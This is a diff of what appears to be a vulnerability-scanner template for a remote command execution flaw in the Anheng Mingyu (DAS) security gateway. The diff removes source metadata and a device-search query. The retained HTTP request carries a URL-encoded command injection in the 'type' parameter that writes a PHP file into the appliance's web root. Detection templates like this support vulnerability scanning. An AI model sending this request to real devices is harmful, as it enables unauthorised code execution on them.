@@ -3,12 +3,8 @@ info:
   name: 安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cg2za7zf932skgxb'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cg2za7zf932skgxb
-    fofa: title="明御安全网关"
 http:
 - raw:
   - 'GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22dudesuite%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2Fdudesuite.php%0a HTTP/1.1
